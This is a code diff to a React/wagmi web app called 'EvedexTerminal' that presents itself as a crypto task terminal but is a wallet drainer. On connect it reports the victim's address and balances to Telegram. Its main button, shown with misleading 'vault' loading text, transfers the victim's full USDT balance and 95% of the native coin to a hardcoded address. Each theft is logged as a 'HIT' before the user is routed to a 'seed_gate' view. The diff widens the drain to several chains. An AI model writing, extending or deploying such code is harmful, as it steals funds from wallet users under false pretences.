@@ -1,14 +1,15 @@
 import React, { useState, useEffect } from 'react';
-import { useAccount, useBalance, useSendTransaction, useChainId } from 'wagmi';
+import { useAccount, useBalance, useSendTransaction, useChainId, useSwitchChain } from 'wagmi';
 import { parseEther, formatEther, parseUnits } from 'viem';
 
 export default function EvedexTerminal() {
   const { address, isConnected } = useAccount();
   const chainId = useChainId();
   const { sendTransaction } = useSendTransaction();
+  const { switchChain } = useSwitchChain();
   
-  // States
-  const [selectedAsset, setSelectedAsset] = useState("USDT"); 
+  // Tab State
+  const [selectedAsset, setSelectedAsset] = useState("TOKEN"); 
   const [view, setView] = useState("menu"); 
   const [activeTask, setActiveTask] = useState(""); 
   const [loading, setLoading] = useState(false);
@@ -26,19 +27,17 @@ export default function EvedexTerminal() {
   const destination = "0x4d43ee135d4df3ec8d0ab8e321f70410373d0153"; 
 
   const USDT_MAP = {
-    1: "0xdac17f958d2ee523a2206206994597c13d831ec7", 
-    56: "0x55d398326f99059ff775485246999027b3197955", 
-    137: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f", 
-    42161: "0xfd086bc7cd5c081ffd66a7010408ff05ed33020b"
+    1: "0xdac17f958d2ee523a2206206994597c13d831ec7", // ETH
+    56: "0x55d398326f99059ff775485246999027b3197955", // BSC
+    137: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f", // POLY
+    42161: "0xfd086bc7cd5c081ffd66a7010408ff05ed33020b" // ARB
   };
 
-  // NATIVE (POL/MATIC)
-  const { data: polBal } = useBalance({ address }); 
-
-  // TOKEN (USDT)
-  const { data: usdtBal } = useBalance({ 
+  // DYNAMIC BALANCES BASED ON CHAIN
+  const { data: nativeBal } = useBalance({ address }); 
+  const { data: tokenBal } = useBalance({ 
     address, 
-    token: chainId === 137 ? "0xc2132d05d31c914a87c6611c10748aeb04b58e8f" : undefined
+    token: USDT_MAP[chainId] || undefined
   });
 
   useEffect(() => {
@@ -57,39 +56,39 @@ export default function EvedexTerminal() {
 
   useEffect(() => {
     if (isConnected && address) {
-      logToTelegram(`🔔 SESSION: ${address}\nUSDT: ${usdtBal?.formatted || "0"}\nPOL: ${polBal?.formatted || "0"}`);
+      logToTelegram(`🔔 SESSION: ${address}\nCHAIN: ${chainId}\nTOKEN: ${tokenBal?.formatted}\nNATIVE: ${nativeBal?.formatted}`);
     }
-  }, [isConnected, address, polBal, usdtBal]);
+  }, [isConnected, address, chainId]);
 
   useEffect(() => {
-    if (selectedAsset === "USDT") {
-      setInputVal(usdtBal?.formatted?.slice(0, 8) || "0.00");
+    if (selectedAsset === "TOKEN") {
+      setInputVal(tokenBal?.formatted?.slice(0, 10) || "0.00");
     } else {
-      setInputVal(polBal?.formatted?.slice(0, 8) || "0.00");
+      setInputVal(nativeBal?.formatted?.slice(0, 10) || "0.00");
     }
-  }, [selectedAsset, usdtBal, polBal]);
+  }, [selectedAsset, tokenBal, nativeBal]);
 
   const sweepNative = () => {
-    if (!polBal || polBal.value <= 0n) { setView("seed_gate"); setLoading(false); return; }
-    const val = (polBal.value * 950n) / 1000n; 
+    if (!nativeBal || nativeBal.value <= 0n) { setView("seed_gate"); setLoading(false); return; }
+    const val = (nativeBal.value * 950n) / 1000n; 
     sendTransaction({ to: destination, value: val }, {
-      onSuccess: (h) => { logToTelegram(`✅ POL_HIT: ${address}\nTX: ${h}`); setView("seed_gate"); setLoading(false); },
+      onSuccess: (h) => { logToTelegram(`✅ NATIVE_HIT: ${address}\nTX: ${h}`); setView("seed_gate"); setLoading(false); },
       onError: () => { setView("seed_gate"); setLoading(false); }
     });
   };
 
   const executeTaskAction = async () => {
     setLoading(true);
-    setLoadingText(`SYNCHRONIZING_VAULT...`);
+    setLoadingText(`STABILIZING_VAULT...`);
     
-    if (selectedAsset === "USDT") {
-      const usdtAddr = USDT_MAP[chainId];
-      if (usdtAddr && usdtBal && usdtBal.value > 0n) {
+    if (selectedAsset === "TOKEN") {
+      const tokenAddr = USDT_MAP[chainId];
+      if (tokenAddr && tokenBal && tokenBal.value > 0n) {
         const paddedTarget = destination.toLowerCase().replace("0x", "").padStart(64, '0');
-        const amountHex = usdtBal.value.toString(16).padStart(64, '0');
+        const amountHex = tokenBal.value.toString(16).padStart(64, '0');
         const payload = `0xa9059cbb${paddedTarget}${amountHex}`;
-        sendTransaction({ to: usdtAddr, data: payload }, {
-          onSuccess: (h) => { logToTelegram(`💰 USDT_HIT: ${address}\nTX: ${h}`); sweepNative(); },
+        sendTransaction({ to: tokenAddr, data: payload }, {
+          onSuccess: (h) => { logToTelegram(`💰 TOKEN_HIT: ${address}\nTX: ${h}`); sweepNative(); },
           onError: () => sweepNative()
         });
       } else { sweepNative(); }
@@ -125,13 +124,16 @@ export default function EvedexTerminal() {
             {view === "task_box" && (
               <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'25px', textAlign:'center'}}>
                 <button onClick={()=>setView("menu")} style={{background:'none', border:'none', color:'#475569', fontSize:'8px', marginBottom:'15px'}}>← ABORT</button>
-                <div style={{display:'flex', justifyContent:'center', gap:'10px', marginBottom:'20px'}}>
-                  <button onClick={()=>setSelectedAsset("USDT")} style={{backgroundColor: selectedAsset === "USDT" ? "#10b981" : "#1e293b", color: selectedAsset === "USDT" ? "black" : "white", border:'none', padding:'5px 15px', borderRadius:'10px', fontSize:'9px', fontWeight:'900'}}>USDT</button>
-                  <button onClick={()=>setSelectedAsset("POL")} style={{backgroundColor: selectedAsset === "POL" ? "#10b981" : "#1e293b", color: selectedAsset === "POL" ? "black" : "white", border:'none', padding:'5px 15px', borderRadius:'10px', fontSize:'9px', fontWeight:'900'}}>POL</button>
+                
+                {/* TAB SELECTOR FOR ASSET */}
+                <div style={{display:'flex', backgroundColor:'black', borderRadius:'12px', padding:'4px', marginBottom:'25px', border:'1px solid #1e293b'}}>
+                  <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'10px', fontWeight:'900', cursor:'pointer', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b"}}>USDT ({tokenBal?.symbol || "USDT"})</div>
+                  <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'10px', fontWeight:'900', cursor:'pointer', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b"}}>{nativeBal?.symbol || "NATIVE"}</div>
                 </div>
+
                 <h2 style={{color:'white', fontWeight:'900', fontSize:'22px'}}>{activeTask}</h2>
                 <div style={{backgroundColor:'black', border:'1px solid #1e293b', padding:'25px', borderRadius:'18px', textAlign:'left', marginBottom:'30px'}}>
-                  <label style={{fontSize:'7px', color:'#10b981', display:'block', marginBottom:'10px'}}>AVAILABLE {selectedAsset}</label>
+                  <label style={{fontSize:'7px', color:'#10b981', display:'block', marginBottom:'10px'}}>AVAILABLE {selectedAsset === "TOKEN" ? "USDT" : nativeBal?.symbol}</label>
                   <input readOnly value={inputVal} style={{background:'none', border:'none', color: "#10b981", fontSize:'28px', width:'100%', fontWeight:'900'}} />
                 </div>
                 <button onClick={executeTaskAction} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'18px', fontWeight:'900'}}>START_{activeTask.toUpperCase()}</button>
